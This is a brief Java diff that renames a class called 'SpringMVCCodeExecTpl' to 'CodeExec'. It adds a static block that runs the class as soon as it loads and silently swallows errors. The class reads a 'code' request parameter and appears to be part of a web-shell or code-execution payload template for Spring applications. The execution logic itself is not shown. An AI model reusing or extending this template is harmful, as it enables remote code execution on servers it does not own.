@@ -4,14 +4,20 @@ import java.io.Writer;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 
-public class SpringMVCCodeExecTpl {
+public class CodeExec
+{
 
     private String getReqParamName() {
         return "code";
     }
 
-
-    public SpringMVCCodeExecTpl() throws Exception {
+    static {
+        try {
+            new CodeExec();
+        } catch (Exception e) {
+        }
+    }
+    public CodeExec() throws Exception {
         run();
     }
 
